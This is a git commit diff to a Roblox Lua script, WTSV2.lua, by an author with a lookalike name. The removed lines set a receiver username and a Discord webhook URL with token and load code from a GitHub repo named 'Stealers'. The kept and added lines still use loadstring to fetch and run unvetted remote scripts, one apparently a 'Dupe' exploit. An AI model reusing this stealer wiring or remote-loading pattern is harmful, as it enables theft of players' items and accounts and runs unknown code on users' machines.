4889c1dc84132b2597b53f02b110dbbf41f4ae01
JoystickpIays <bryllecorro03@gmail.com>
2024-10-19 12:09:51 +0800

    Update WTSV2.lua

--- WTSV2.lua
+++ WTSV2.lua
@@ -1,6 +1,3 @@
-Receiver = "givepetroblox"
-Webhook = "https://discord.com/api/webhooks/1291938134447362048/sqyNP-djIY5M1AQ0eXpFHyRmfYkw2mTP_duMT7Z1k0-DX65rUFUI0whY1ql8y5wQk7uT"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Ezjq/Stealers/refs/heads/main/losg.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JoystickpIays/psychic-octo-invention/refs/heads/main/notification.lua"))()
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/JoystickpIays/nexus/main/Dupe"))() 
